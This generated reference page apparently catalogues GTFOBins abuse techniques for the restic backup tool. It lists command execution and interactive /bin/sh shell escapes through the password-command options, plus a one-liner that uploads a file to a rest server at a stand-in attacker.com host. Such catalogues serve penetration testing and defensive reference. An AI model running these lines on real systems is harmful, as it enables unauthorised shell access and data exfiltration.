---
parsed_by: focuslocust
source: commands
type: generated
---
# restic Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## restic

Tool page: [restic](../../tools/linux/restic.md)

### command

```text
RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/restic` |
| Evidence | Function example preserved from source parser. |

### command

```text
restic --password-command='/path/to/command' backup
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/restic` |
| Evidence | Function example preserved from source parser. |

### shell

```text
RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/restic` |
| Evidence | Function example preserved from source parser. |

### shell

```text
restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/restic` |
| Evidence | Function example preserved from source parser. |

### upload

```text
restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/restic` |
| Evidence | Function example preserved from source parser. |
